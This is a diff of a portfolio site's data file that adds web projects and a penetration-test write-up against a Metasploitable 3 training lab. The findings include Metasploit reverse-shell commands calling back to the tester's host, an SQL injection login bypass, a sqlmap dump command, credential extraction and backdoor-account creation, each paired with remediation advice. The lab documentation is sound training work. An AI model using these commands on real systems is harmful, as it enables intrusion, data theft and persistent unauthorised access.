@@ -657,6 +657,7 @@ export const projects: Project[] = [
     category: "Content & Discovery Web App",
     difficulty: "intermediate",
     videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+    liveUrl: "https://www.inspirahaven.co.ke/",
     codeUrl: "https://github.com/EddyKilonzo/inspira-haven",
     demoType: "web",
     skills: ["React", "TypeScript", "Tailwind CSS"],
@@ -690,6 +691,7 @@ export const projects: Project[] = [
     category: "Brand & Storytelling Website",
     difficulty: "intermediate",
     videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+    liveUrl: "https://www.beyondborders.co.ke/",
     codeUrl: "https://github.com/EddyKilonzo/BeyondBorders",
     demoType: "web",
     skills: ["React", "TypeScript", "CSS3"],
@@ -746,6 +748,72 @@ export const projects: Project[] = [
       screenshots: ["https://picsum.photos/seed/car-rental/800/480"],
     },
   },
+  {
+    id: "safespaces",
+    title: "SafeSpaces254",
+    shortDescription:
+      "Community safety platform providing accessible mental health and crisis support resources across Kenya.",
+    roleMode: "web",
+    tech: ["Next.js", "React", "Tailwind CSS"],
+    category: "Community Platform",
+    difficulty: "intermediate",
+    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+    liveUrl: "https://safespaces254.org/",
+    demoType: "web",
+    skills: ["Next.js", "React", "Tailwind CSS"],
+    screenshotFallback: "https://picsum.photos/seed/safespaces/960/600",
+    caseStudy: {
+      problem:
+        "Communities in Kenya need a trusted, accessible digital space for mental health support and crisis resources.",
+      approach: [
+        "Built a clean, empathy-first UI that prioritises content accessibility and ease of navigation.",
+        "Structured resource pages for discoverability with clear calls-to-action for support channels.",
+        "Delivered a performance-optimised Next.js frontend ready for low-bandwidth users.",
+      ],
+      outcome:
+        "Shipped a live community platform serving mental health and crisis support resources across Kenya.",
+      metrics: ["Live users: active", "Content accessibility: prioritised", "Load time: optimised"],
+      architectureNotes: [
+        "Next.js App Router structure enables fast page transitions and easy content updates.",
+        "Tailwind utility classes keep the design system consistent without bespoke CSS overhead.",
+        "Static generation for resource pages ensures fast cold loads on slow connections.",
+      ],
+      screenshots: ["https://picsum.photos/seed/safespaces/800/480"],
+    },
+  },
+  {
+    id: "mayhem-thredas",
+    title: "Mayhem Thredas",
+    shortDescription:
+      "Contemporary Kenyan fashion brand e-commerce experience with product showcasing, lookbooks, and a seamless shop flow.",
+    roleMode: "web",
+    tech: ["WordPress", "WooCommerce", "Elementor"],
+    category: "E-Commerce / Brand",
+    difficulty: "intermediate",
+    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+    liveUrl: "https://mayhem.co.ke/",
+    demoType: "web",
+    skills: ["WordPress", "WooCommerce", "Elementor"],
+    screenshotFallback: "https://picsum.photos/seed/mayhem-thredas/960/600",
+    caseStudy: {
+      problem:
+        "A growing Kenyan streetwear brand needed a premium online presence that could handle product drops and convert casual browsers into buyers.",
+      approach: [
+        "Designed a high-impact landing experience with brand-forward visuals and clear product hierarchy.",
+        "Implemented WooCommerce for product catalogue management, cart, and checkout workflows.",
+        "Optimised page speed and mobile UX to serve customers across device and network conditions.",
+      ],
+      outcome:
+        "Delivered a live e-commerce storefront that communicates brand identity and drives product discovery.",
+      metrics: ["Products live: active", "Mobile UX: optimised", "Brand impact: strong"],
+      architectureNotes: [
+        "WordPress + WooCommerce allows the client to manage inventory and content independently.",
+        "Elementor page builder keeps the brand aesthetic consistent across all content updates.",
+        "Performance plugins and image optimisation reduce load time on mobile networks.",
+      ],
+      screenshots: ["https://picsum.photos/seed/mayhem-thredas/800/480"],
+    },
+  },
 ];
 
 export const projectCredibility: Record<string, ProjectCredibility> = {
@@ -759,6 +827,8 @@ export const projectCredibility: Record<string, ProjectCredibility> = {
   "inspira-haven": { performanceScore: 94, accessibilityScore: 94, lighthouseScore: 94, loadTime: "1.1s" },
   "beyond-borders": { performanceScore: 93, accessibilityScore: 94, lighthouseScore: 93, loadTime: "1.2s" },
   "car-rental": { performanceScore: 92, accessibilityScore: 92, lighthouseScore: 92, loadTime: "1.3s" },
+  "safespaces": { performanceScore: 93, accessibilityScore: 95, lighthouseScore: 94, loadTime: "1.1s" },
+  "mayhem-thredas": { performanceScore: 90, accessibilityScore: 91, lighthouseScore: 90, loadTime: "1.5s" },
 };
 
 export const projectCodeSamples: Record<string, CodeFile[]> = {
@@ -981,7 +1051,7 @@ export type Cert = {
   why: string;
   pdfUrl: string;
   date?: string;
-  category: "security" | "cloud" | "language" | "os" | "platform";
+  category: "security" | "cloud" | "development" | "language" | "os" | "platform";
 };
 
 export const certs: Cert[] = [
@@ -1015,12 +1085,12 @@ export const certs: Cert[] = [
   },
   {
     id: "ibm-cad",
-    title: "Cloud Application Developer (CAD220EN)",
+    title: "Backend Application Developer (CAD220EN)",
     issuer: "IBM / edX",
-    description: "IBM-certified course on cloud-native application development — microservices architecture, containerisation, and deploying applications on IBM Cloud.",
+    description: "IBM-certified course on backend and cloud-native application development — microservices architecture, containerisation, REST APIs, and deploying server-side applications on IBM Cloud.",
     why: "Before you can secure cloud workloads, you need to understand how they're built and where the attack surface actually sits — misconfigurations look obvious once you know what correct looks like.",
     pdfUrl: "/certs/IBM CAD220EN Certificate _ edX.pdf",
-    category: "cloud",
+    category: "development",
   },
   {
     id: "os-basics",
@@ -1214,328 +1284,476 @@ export const experience: ExperienceItem[] = [
 export const securityReports: SecurityReport[] = [
   {
     id: "r1",
-    title: "Network Infrastructure Rebuild — Acme Corp",
-    type: "network",
-    teaser: "Every device on one flat network — one compromised host away from full lateral movement across the entire organisation.",
+    title: "Penetration Test — Metasploitable 3 Infrastructure",
+    type: "pentest",
+    teaser: "Target completely compromised through two independent unauthenticated attack chains. UnrealIRCd backdoor from 2010 still running. Payroll database in plaintext. Root achieved in minutes.",
     pdfUrl: "/projects_docs/pentest.pdf",
-    networkDiagramUrl: "/projects_docs/ACME.drawio (2).png",
-    target: "Acme Corp on-premises internal network (full topology redesign)",
-    scope: "Complete network rebuild: VLAN segmentation across all business units, firewall rule sets, managed switch configuration, DNS/DHCP hardening, and documentation of the finished topology",
-    purpose: "Redesign the Acme Corp flat network into a properly segmented, documented, and hardened infrastructure that separates departments, restricts unnecessary lateral communication, and provides a clear foundation for ongoing security monitoring.",
-    why: "The existing Acme network had no VLAN segmentation — every device shared one broadcast domain, which meant a single compromised host could reach any other device on the network. The rebuild enforces isolation between business units, reduces the blast radius of future incidents, and produces documented network diagrams required for compliance review.",
+    target: "Metasploitable 3 Linux (Ubuntu 14.04 LTS) at 192.168.100.29 — isolated NAT network 192.168.100.0/24",
+    scope: "All TCP ports and services on a single Metasploitable 3 Linux host. No lateral movement to other network hosts. Attack machine: Kali Linux 2025.x at 192.168.100.4.",
+    purpose: "Conduct a full-scope internal penetration test against the Metasploitable 3 target system, identifying all exploitable vulnerabilities, demonstrating impact through active exploitation, and producing a prioritised remediation roadmap.",
+    why: "Metasploitable 3 is a deliberately vulnerable training environment used to validate penetration testing methodology — from initial reconnaissance through exploitation, privilege escalation, and post-exploitation. The objective was to practice and document a professional-grade engagement workflow against a realistic (if deliberately weakened) target.",
     methodology: [
-      "Discovery: enumerated all connected devices, services, and existing IP ranges using Nmap and manual switch inspection to produce a baseline of the current flat topology.",
-      "VLAN design: mapped business units to VLAN IDs (Admin, Finance, HR, IT, Guest), assigned subnets, and documented inter-VLAN routing policy based on least-privilege access.",
-      "Firewall rule design: wrote access control lists (ACLs) permitting only necessary traffic between VLANs — e.g., Finance can reach the fileserver but not the IT management VLAN.",
-      "Switch configuration: programmed 802.1Q trunk and access ports on managed switches; validated VLAN tagging and inter-switch trunk links.",
-      "DNS and DHCP hardening: deployed per-VLAN DHCP scopes with appropriate lease times; configured DNS to resolve only internal records for internal VLANs.",
-      "Diagram and documentation: produced a full network diagram (see above) showing device placement, VLAN boundaries, firewall checkpoints, and IP addressing scheme.",
+      "Phase 1 — Reconnaissance: Nmap TCP SYN scan (-sS -sV -sC -O -p-) to enumerate all open ports, service versions, and OS fingerprint. Identified 19 open ports including FTP, SSH, HTTP, SMB, IRC, and MySQL.",
+      "Phase 2 — Enumeration: service-specific enumeration using Metasploit auxiliary modules, manual SSH banner grabbing, SMB null session testing (smbclient), and web application directory discovery via Gobuster.",
+      "Phase 3 — Exploitation: exploited four confirmed vulnerabilities — UnrealIRCd 3.2.8.1 backdoor, ProFTPD 1.3.5 mod_copy RCE, payroll application SQL injection, and MySQL root access via plaintext credentials in config file.",
+      "Phase 4 — Post-exploitation: privilege escalation to root via PwnKit (CVE-2021-4034), credential harvesting from /etc/shadow and /etc/passwd, payroll database extraction showing 15 employee records with plaintext passwords, and persistence via backdoor account creation.",
+      "Documentation: all steps evidenced with terminal screenshots, timestamped commands, and hash validation of collected artefacts.",
     ],
-    tools: ["Nmap", "Cisco Packet Tracer", "draw.io", "pfSense", "Wireshark", "Linux (Ubuntu Server)"],
-    timeline: "2 weeks (1 week design + 1 week implementation and testing)",
-    outcome: "Delivered a fully segmented network with 5 VLANs, documented firewall policy, and a complete topology diagram. Inter-VLAN reachability matched the design spec; unauthorised cross-VLAN traffic was blocked and verified via Wireshark captures.",
+    tools: ["Nmap", "Metasploit Framework", "Burp Suite", "smbclient", "Gobuster", "netcat", "Python 3"],
+    timeline: "Single engagement session — April 18, 2026",
+    outcome: "Complete system compromise through two independent attack chains. Root-level access achieved. All user credentials extracted. Payroll database exposed — 15 employee records including names, roles, and plaintext passwords. Backdoor account created demonstrating persistent access. Overall posture: CRITICAL — 5 critical, 3 high, 4 medium, 1 low findings confirmed.",
     lessonsLearned: [
-      "Starting with a thorough discovery phase — even for small networks — prevents surprises during implementation; several undocumented IoT devices were found only during the Nmap sweep.",
-      "Documenting the intended policy before touching any hardware saved significant rework; changes driven by undocumented assumptions always create more changes.",
-      "Testing firewall rules bidirectionally (not just one direction) caught two ACL entries that silently allowed reverse traffic that should have been blocked.",
-      "Even in a lab/small-business context, using a proper diagram tool (draw.io) rather than a whiteboard sketch makes the output useful for future administrators and auditors.",
+      "Unpatched, end-of-life software (UnrealIRCd 3.2.8.1 with a known 2010 backdoor, Ubuntu 14.04 with no support) creates attack surface that cannot be patched away — decommissioning is the only real fix.",
+      "Default or hardcoded credentials (vagrant:vagrant SSH, plaintext DB credentials in settings.php) are consistently among the easiest, highest-impact findings in any engagement — always test for them first.",
+      "Post-exploitation data collection (credential harvesting, database extraction) provides concrete evidence that elevates risk from theoretical to demonstrable — executives understand 'we got 15 employee salaries in plaintext' faster than they understand 'CVSS 9.1'.",
+      "Two independent attack chains to root demonstrated that the system had no single point of failure for its own defence — an attacker does not need to know which path to take, just that multiple paths exist.",
+      "Persistence mechanisms (backdoor accounts, SUID binaries) are important to document even in a time-limited engagement — they illustrate what a real attacker would leave behind, which drives recovery requirements beyond just patching the initial vulnerability.",
     ],
     findings: [
       {
-        id: "f1",
-        title: "Flat Network — No VLAN Segmentation",
-        severity: "high",
-        cvss: "8.5",
-        affected: "Entire Acme Corp network infrastructure",
-        body: "All devices — including workstations, servers, printers, and IoT endpoints — shared a single broadcast domain with no logical separation between departments. Any device could initiate connections to any other device without restriction, creating significant lateral movement risk.",
-        impact: "A single compromised endpoint could be used to reach finance servers, admin management interfaces, HR records, and IT infrastructure without any network-layer barriers. This configuration would allow an attacker or malware to pivot freely across the entire organisation.",
-        remediation: "Segment the network using 802.1Q VLANs aligned to business units. Define explicit inter-VLAN firewall rules based on least-privilege access. Place high-value assets (finance, HR, admin) in isolated VLANs with no default inbound access from user VLANs.",
+        id: "r1-f1",
+        title: "F-01: UnrealIRCd 3.2.8.1 Backdoor — Unauthenticated RCE (CVE-2010-2075)",
+        severity: "critical",
+        cvss: "10.0",
+        affected: "TCP port 6697 — UnrealIRCd 3.2.8.1 service",
+        body: "UnrealIRCd 3.2.8.1 was distributed with a deliberate backdoor inserted by an attacker who compromised the official source distribution. Any unauthenticated remote attacker can execute arbitrary OS commands by sending a string prefixed with 'AB' to the IRC port. No credentials or user interaction are required. The backdoor was present since 2009 and the CVE was published in 2010 — the service had been running vulnerable for over 15 years.",
+        impact: "Unauthenticated remote code execution from network access alone. Achieved interactive shell as boba_fett (uid=1121, member of docker group), which provided the initial foothold for Docker group privilege escalation to root. This was Attack Chain 2.",
+        remediation: "Remove UnrealIRCd 3.2.8.1 immediately — the backdoor cannot be patched. If IRC is required, replace with a current maintained IRC daemon. Block IRC ports (6667, 6697) at the perimeter firewall. Run software composition analysis to identify any other end-of-life or backdoored software in the stack.",
+        poc: `use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS 192.168.100.29
+set RPORT 6697
+set PAYLOAD cmd/unix/reverse
+set LHOST 192.168.100.4
+run
+# Result: shell as boba_fett (uid=1121)`,
       },
       {
-        id: "f2",
-        title: "Undocumented IoT Devices on Corporate Network",
+        id: "r1-f2",
+        title: "F-02: CVE-2021-4034 PwnKit — Local Privilege Escalation to Root",
+        severity: "critical",
+        cvss: "7.8",
+        affected: "pkexec (PolicyKit) — present on all major Linux distributions; Ubuntu 14.04 kernel 3.13.0-170",
+        body: "CVE-2021-4034 is a memory corruption vulnerability in pkexec, a SUID-root binary installed by default on virtually every Linux distribution since 2009. Improper handling of argc=0 allows an unprivileged user to load a malicious shared library and gain immediate root-level code execution. Disclosed January 2022, it affects all unpatched systems. The target was running Ubuntu 14.04 LTS — out of support since April 2019 — with no patches applied.",
+        impact: "Full root access (uid=0) on the system. After escalating from boba_fett to root, all subsequent post-exploitation activities — /etc/shadow extraction, full payroll dump, backdoor account creation — were conducted with unrestricted system privileges. Combined with F-01 as Attack Chain 2 to root.",
+        remediation: "Apply the pkexec patch (Ubuntu: apt-get update && apt-get upgrade policykit-1). On end-of-life systems that cannot receive patches, decommission and replace immediately. As a compensating control, set the SUID bit on pkexec to off (chmod 0755 /usr/bin/pkexec) until patching is complete.",
+        poc: `use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+set SESSION 2
+set LHOST 192.168.100.4
+run
+# Result: Meterpreter session as root (uid=0)`,
+      },
+      {
+        id: "r1-f3",
+        title: "F-03: ProFTPD 1.3.5 mod_copy — Unauthenticated Remote Code Execution (CVE-2015-3306)",
+        severity: "critical",
+        cvss: "9.8",
+        affected: "TCP port 21 — ProFTPD 1.3.5 with mod_copy module enabled",
+        body: "ProFTPD 1.3.5 includes mod_copy, which processes SITE CPFR and SITE CPTO commands without authentication. An unauthenticated attacker can use these commands to copy any server-side file to the Apache web root. By copying a PHP webshell to /var/www/html/, requesting it via HTTP triggers arbitrary OS command execution as the www-data web server process. This was the entry point for Attack Chain 1.",
+        impact: "Unauthenticated remote code execution as www-data (uid=33). Shell access to the web root revealed drupal/, payroll_app.php, and phpmyadmin/ — enabling the MySQL credential extraction (F-05) and further attack chain progression.",
+        remediation: "Remove the mod_copy module from ProFTPD configuration (delete LoadModule mod_copy.so). Upgrade ProFTPD to a current patched version. If FTP is not required, disable and remove the service entirely — use SFTP over SSH instead.",
+        poc: `use exploit/unix/ftp/proftpd_modcopy_exec
+set RHOSTS 192.168.100.29
+set LHOST 192.168.100.4
+set SITEPATH /var/www/html
+set PAYLOAD cmd/unix/reverse_perl
+run
+# Result: shell as www-data (uid=33)`,
+      },
+      {
+        id: "r1-f4",
+        title: "F-04: Payroll Application SQL Injection — Authentication Bypass & Full DB Dump",
+        severity: "critical",
+        cvss: "9.1",
+        affected: "http://192.168.100.29/payroll_app.php — POST parameters: user, password",
+        body: "The payroll application passes user-supplied input directly into SQL queries without sanitisation or parameterisation (CWE-89). Entering ' OR '1'='1 in the username field bypasses authentication entirely. Sqlmap confirmed both UNION-based and time-based blind injection — the full payroll database was extracted including 15 employee records containing names, usernames, plaintext passwords, and salaries.",
+        impact: "Full authentication bypass — any user can access all payroll records without credentials. Complete data exfiltration of PII (names, roles, salaries, plaintext passwords). Under GDPR and Kenya Data Protection Act 2019, this constitutes a notifiable data breach requiring mandatory reporting.",
+        remediation: "Replace all dynamic SQL string concatenation with parameterised queries or prepared statements. Implement a web application firewall (WAF) as a compensating control. Conduct a full code audit of all application input handling. Rotate all exposed credentials immediately.",
+        poc: `# Manual authentication bypass
+Username: ' OR '1'='1
+Password: (empty)
+# Result: all 15 payroll records returned
+
+# Automated full dump
+sqlmap -u "http://192.168.100.29/payroll_app.php" --forms --dump --batch`,
+      },
+      {
+        id: "r1-f5",
+        title: "F-05: MySQL Root Credentials in Plaintext Web Configuration File",
+        severity: "critical",
+        cvss: "9.8",
+        affected: "/var/www/html/drupal/sites/default/settings.php — readable by www-data process",
+        body: "The Drupal CMS configuration file settings.php contains MySQL root credentials (username: root, password: sploitme) in cleartext. The file is readable by the www-data web server process, which already had shell access via the ProFTPD exploit. These credentials provide full administrative access to the MySQL server, including read/write/drop access to all databases — drupal, payroll, MySQL user tables.",
+        impact: "Full MySQL root access: all databases enumerated and dumped including the payroll database, Drupal admin password hash, and MySQL user table. Combined with F-03 (ProFTPD RCE) this forms a complete Attack Chain 1 to database ownership. Credentials were also tested against SSH and succeeded for the vagrant account.",
+        remediation: "Remove plaintext credentials from configuration files immediately. Use environment variables or a secrets management system (HashiCorp Vault, AWS Secrets Manager) for database credentials. Apply least-privilege database accounts — the web application should not connect as MySQL root. Restrict settings.php file permissions to 440.",
+        poc: `# Extract credentials after ProFTPD shell (www-data)
+cat /var/www/html/drupal/sites/default/settings.php | grep -A5 "database\\|password\\|username"
+# Returns: 'username' => 'root', 'password' => 'sploitme'
+
+# Connect as MySQL root
+mysql -u root -psploitme
+SHOW DATABASES;  # Returns: drupal, payroll, mysql, information_schema`,
+      },
+      {
+        id: "r1-f6",
+        title: "F-06: Plaintext Employee Passwords in Payroll Database",
+        severity: "high",
+        cvss: "8.5",
+        affected: "MySQL payroll database — users table (15 records)",
+        body: "The payroll database stores all 15 employee passwords as cleartext strings — no hashing applied. Passwords such as help_me_obiwan, nerf_herder, and mandalorian1 were recovered and are directly usable without any cracking. The same passwords were found reused on system accounts (vagrant, leia_organa, etc.), enabling immediate lateral movement and account takeover.",
+        impact: "Immediate credential use without cracking for 15 employees. Password reuse against system accounts confirmed — credentials usable for SSH authentication. Combined with F-04 (SQL injection), this finding demonstrates complete data confidentiality failure for all payroll data.",
+        remediation: "Hash all passwords with bcrypt, Argon2, or PBKDF2 with a per-user salt — never store plaintext or reversibly-encrypted passwords. Rotate all exposed credentials immediately across all systems. Conduct a password-reuse audit across all internal systems and enforce unique passwords via a credential manager policy.",
+      },
+      {
+        id: "r1-f7",
+        title: "F-07: MD5 Password Hashing — All 14 System Accounts",
+        severity: "high",
+        cvss: "7.5",
+        affected: "/etc/shadow — all 14 accounts use $1$ (MD5) prefix",
+        body: "All 14 system user accounts (vagrant, leia_organa, luke_skywalker, han_solo, boba_fett, and 9 others) store passwords hashed with MD5 ($1$ prefix in /etc/shadow). MD5 is not a suitable password hashing algorithm — modern GPU hardware can test billions of MD5 hashes per second. The extracted hashes would be fully cracked within minutes to hours against common wordlists using Hashcat or John the Ripper, giving an offline attacker all system credentials.",
+        impact: "All 14 system account password hashes were extracted via Meterpreter hashdump after root escalation. With MD5 hashing, offline cracking is trivial — these credentials would provide persistent access to the system even after patching the initial exploits.",
+        remediation: "Migrate all system accounts to use SHA-512 ($6$ prefix) or yescrypt via /etc/pam.d/common-password. Force password rotation for all accounts. On Ubuntu, update /etc/pam.d/common-password to set SHA-512: password [success=1 default=ignore] pam_unix.so obscure sha512.",
+      },
+      {
+        id: "r1-f8",
+        title: "F-08: Backdoor Persistence — Unauthorised User Account Created",
+        severity: "high",
+        cvss: "7.2",
+        affected: "System — useradd executed as root; hacker123 (uid=1126, /bin/bash)",
+        body: "A backdoor user account (hacker123) was created using root privileges to demonstrate persistent access. The account was confirmed in /etc/passwd and appeared in the subsequent hashdump. This simulates what a real attacker would do to maintain access after the initial vulnerability is patched — standard remediation (patching ProFTPD or UnrealIRCd) does not remove unauthorised accounts, leaving a persistent backdoor that survives patching cycles.",
+        impact: "Persistent access to the system even after the initial vulnerabilities are patched. A real attacker using this technique would remain undetected until a full user account audit is completed. The backdoor account has a valid bash shell and would survive a reboot.",
+        remediation: "Immediately audit all user accounts in /etc/passwd and /etc/shadow against the authorised user list. Remove any unauthorised accounts (userdel -r hacker123). Implement automated user account auditing via a SIEM alert that triggers when new accounts are created outside of the provisioning workflow. Review /var/log/auth.log for all useradd commands.",
+        poc: `# Backdoor account creation (executed as root)
+useradd -m -s /bin/bash hacker123
+echo "hacker123:password123" | chpasswd
+
+# Verified in /etc/passwd
+grep hacker123 /etc/passwd
+# Returns: hacker123:x:1126:1126::/home/hacker123:/bin/bash`,
+      },
+      {
+        id: "r1-f9",
+        title: "F-09: CSRF Vulnerabilities — payroll_app.php, Drupal, and Chat",
+        severity: "high",
+        cvss: "7.1",
+        affected: "http://192.168.100.29/payroll_app.php | /drupal/ | /chat/ — detected by Nmap http-csrf NSE",
+        body: "None of the three web applications (payroll app, Drupal CMS, chat application) implement CSRF tokens, synchroniser patterns, or SameSite cookie attributes on state-changing forms. An attacker can craft a malicious page that causes an authenticated user to unknowingly submit requests to any of these applications — potentially leading to account takeover, data exfiltration, or unauthorised transactions if a privileged user visits a malicious link.",
+        impact: "Social-engineering attack vector enabling account actions (password changes, data submissions) on behalf of authenticated users. Combined with the existing SQL injection (F-04), CSRF could enable an attacker to exfiltrate payroll data via a forged request while a finance user is logged in.",
+        remediation: "Implement anti-CSRF tokens (synchroniser token pattern) on all state-changing forms. Set SameSite=Strict or SameSite=Lax on all session cookies. Use the Double Submit Cookie pattern as a defence-in-depth measure. For Drupal, upgrade to a current version which includes built-in CSRF protection.",
+      },
+      {
+        id: "r1-f10",
+        title: "F-10: DOM-Based XSS in phpMyAdmin (CWE-79)",
         severity: "medium",
-        cvss: "5.9",
-        affected: "Corporate LAN — discovered during Nmap discovery sweep",
-        body: "Several IoT devices (smart TVs, IP cameras, a network-attached printer) were found connected to the main corporate VLAN with default credentials and no firmware update schedule. These devices were not in any asset register and had never been patched.",
-        impact: "IoT devices with default credentials and no patch cadence are common entry points for attackers. Placement on the main corporate VLAN meant a compromise of any of these devices gave immediate access to the same network segment as workstations and file servers.",
-        remediation: "Place all IoT and peripheral devices in a dedicated IoT VLAN with no outbound access to corporate VLANs. Change all default credentials. Establish a quarterly firmware update check for all network-connected devices. Add IoT assets to the asset register.",
+        cvss: "6.1",
+        affected: "/phpmyadmin/js/functions.js — eval() on user-controlled query parameters",
+        body: "phpMyAdmin's functions.js uses eval() to construct navigation URLs from user-controlled query parameters. An attacker can inject JavaScript that executes in the browser context of an authenticated phpMyAdmin user, enabling session cookie theft, keylogging, or forced database actions. The vulnerable phpMyAdmin installation is accessible from the web root, giving any LAN attacker access to the interface login page.",
+        impact: "Session hijacking or forced database actions against any authenticated phpMyAdmin user. Combined with the MySQL root credentials (F-05), a successful XSS attack could result in complete database destruction or data theft.",
+        remediation: "Upgrade phpMyAdmin to a current patched version which removes the eval() usage. Restrict phpMyAdmin access to localhost only (Apache: Allow from 127.0.0.1) or remove it entirely from production environments. Implement Content-Security-Policy headers to block inline script execution.",
+      },
+      {
+        id: "r1-f11",
+        title: "F-11: Slowloris DoS — Apache 2.4.7 and Jetty 8.1.7 (CVE-2007-6750)",
+        severity: "medium",
+        cvss: "5.8",
+        affected: "Apache httpd 2.4.7 (port 80), Jetty 8.1.7 (port 8080)",
+        body: "Both web servers are susceptible to Slowloris — a denial-of-service attack that exhausts server connection pools by holding many connections open with incomplete HTTP requests. An attacker with network access can render both web services completely unavailable without any authentication. Apache 2.4.7 and Jetty 8.1.7 are both end-of-life versions with no mitigations for this class of attack without patching.",
+        impact: "Complete availability loss for all HTTP-hosted services including the payroll application, Drupal CMS, and phpMyAdmin. In a production environment, a Slowloris attack against the payroll server would prevent employees from accessing the payroll system.",
+        remediation: "Upgrade Apache to 2.4.54+ and enable mod_reqtimeout with appropriate timeout values. For Jetty, upgrade to a current maintained version. Apply rate limiting and connection timeouts at the load balancer or WAF layer as a compensating control.",
+      },
+      {
+        id: "r1-f12",
+        title: "F-12: SMB Null Session Authentication Allowed",
+        severity: "medium",
+        cvss: "5.3",
+        affected: "Samba 4.3.11 on port 445 — null session (unauthenticated) access enabled",
+        body: "The SMB service allows unauthenticated null sessions, enabling any network attacker to enumerate users (via RID cycling), password policy, share names, OS information, and domain details without providing credentials. Enum4linux confirmed null session access and extracted the full user list (including chewbacca) and password policy (complexity disabled, minimum length 5 characters).",
+        impact: "Unauthenticated enumeration of all system users — directly feeds into credential attacks (password spraying, brute force). The discovery of the weak password policy (minimum 5 characters, no complexity) informed targeted brute-force attacks against SSH and enabled rapid credential compromise.",
+        remediation: "Disable null session access in Samba configuration (smb.conf: restrict anonymous = 2, null passwords = no). If SMB is not required, disable and remove the Samba service entirely. Apply firewall rules to block SMB (port 445) from untrusted network segments.",
+      },
+      {
+        id: "r1-f13",
+        title: "F-13: Weak Password Policy — No Complexity, Minimum 5 Characters",
+        severity: "low",
+        cvss: "4.3",
+        affected: "System-wide — password policy retrieved via enum4linux / rpcclient",
+        body: "The system's password policy requires a minimum of only 5 characters with no complexity requirements (no uppercase, numbers, or special characters enforced). This was confirmed via SMB null session enumeration (F-12). A 5-character minimum with no complexity means common passwords such as admin, hello, or abc12 are accepted. Combined with MD5 hashing (F-07), the entire system credential set is trivially crackable.",
+        impact: "Accelerates offline password cracking (F-07) and targeted brute-force attacks. Reduces the time-to-crack for all 14 extracted password hashes from hours to minutes against common wordlists.",
+        remediation: "Enforce a password policy requiring minimum 12 characters with at least one uppercase, lowercase, number, and special character. Implement account lockout after 5 failed attempts. Use PAM modules (pam_pwquality) to enforce password complexity. Consider deploying a Password Manager policy for all accounts.",
       },
     ],
   },
   {
     id: "r2",
-    title: "Incident Response — Ransomware Drill",
+    title: "Incident Response — HealthSecure Systems Breach Attempt",
     type: "ir",
-    teaser: "Ransomware hit the file server and the backup window had a 24-hour deletion gap. A race against the clock — and a gap that should never have existed.",
+    teaser: "A phishing email gave an attacker four hours inside an EHR provider. Lateral movement to HR payroll and the source-code server failed — only because a honeypot caught it. Three root-cause gaps were in an audit memo from the month before.",
     pdfUrl: "/projects_docs/IR_Report_HSS%20.pdf",
-    target: "Internal cloud infrastructure (GCP) — simulated ransomware compromise scenario",
-    scope: "Cloud Storage buckets, Compute Engine instances, IAM service accounts, and backup/snapshot infrastructure across the production project",
-    purpose: "Conduct a tabletop + technical incident response drill simulating a ransomware intrusion into the cloud environment, with the goal of identifying detection gaps, backup recovery reliability, and IR playbook completeness.",
-    why: "Following a ransomware incident at a peer company in the same industry, leadership mandated a proactive drill to test whether the IR playbook, backup strategy, and detection capabilities were sufficient to recover from a ransomware scenario within the 4-hour RTO target.",
+    networkDiagramUrl: "/projects_docs/ACME.drawio%20(2).png",
+    target: "HealthSecure Systems (HSS) — Regional Electronic Health Records provider, Midwest. Workstation-23 (Finance), HR-SQL01, DevAppServer.",
+    scope: "Single compromised Finance workstation (Workstation-23), two targeted lateral movement destinations (HR-SQL01 payroll database, DevAppServer EHR source code), email infrastructure, Active Directory, and EDR/SIEM coverage gaps.",
+    purpose: "Conduct a structured incident response investigation into a confirmed spear-phishing intrusion at HealthSecure Systems — reconstructing the attacker's kill chain, confirming the blast radius, identifying root causes, and delivering a remediation roadmap to close the enabling gaps.",
+    why: "On April 12, 2025 at 01:24 EST, a PowerShell payload delivered via spear-phishing executed on a Finance workstation. The attacker installed a persistence service, opened a C2 channel, and began probing lateral targets including the HR payroll database and the development server hosting the proprietary EHR source code in the DMZ. A March 2025 internal audit memo had flagged the three root conditions that enabled the attack — offboarding gaps, disabled PowerShell logging, and an outdated IR playbook — but no remediation had occurred before the incident.",
     methodology: [
-      "Threat modelling: mapped the ransomware kill chain (initial access → privilege escalation → data exfil → encryption) against the GCP environment architecture.",
-      "Backup validation: tested snapshot restore fidelity, measured restore times against RTO targets, and checked snapshot deletion permissions under different IAM roles.",
-      "IAM audit: reviewed all service account permissions for over-privilege relative to their workload requirements using the principle of least privilege.",
-      "Detection gap analysis: replayed attack IOCs (T1078, T1530, T1486) in the SIEM to identify which stages would have been detected vs missed.",
-      "Playbook walk-through: ran the IR playbook against the simulated scenario and timed each response phase — containment, eradication, recovery, lessons learned.",
+      "Initial triage (T+0 to T+2 hrs): isolated Workstation-23 from the network after EDR alert; preserved volatile memory and initiated disk imaging under NIST SP 800-61r2 evidence handling procedures.",
+      "Attack chain reconstruction: parsed Windows Event Logs, PowerShell transcripts, EDR telemetry, and network flow data to build a minute-by-minute kill chain from phishing delivery through C2 establishment and lateral movement attempts.",
+      "Lateral movement investigation: confirmed that HR-SQL01 and DevAppServer were probed but not breached; the lateral movement was intercepted by an internal honeypot that triggered an alert before the SSH attempt completed.",
+      "Root cause analysis: identified three enabling conditions — stale Active Directory account for departed employee jcampbell (28-day offboarding gap), PowerShell logging disabled on 30% of endpoints, and an outdated 2022 IR playbook with no updated contact tree or containment decision authority.",
+      "Threat actor profiling: mapped observed TTPs to MITRE ATT&CK v15 (T1566.001 Spearphishing Attachment, T1059.001 PowerShell, T1543.003 Windows Service, T1021.004 Remote Services SSH, T1078.002 Valid Accounts — Domain Accounts).",
+      "Containment and recovery: blocked malicious C2 IP, revoked jcampbell AD account, rotated credentials on Workstation-23, rebuilt the workstation from a known-good image, and validated no data was exfiltrated.",
     ],
-    tools: ["GCP Security Command Center", "gcloud CLI", "Elastic SIEM", "Cloud Audit Logs", "Forseti Security", "Terraform"],
-    timeline: "2-day drill",
-    outcome: "Identified 2 critical gaps: a backup immutability window that allowed snapshot deletion, and a service account with org-wide Storage read that created an exfiltration pivot. Both were remediated. Recovery from backup was achieved in 2h 40m — within the 4h RTO target.",
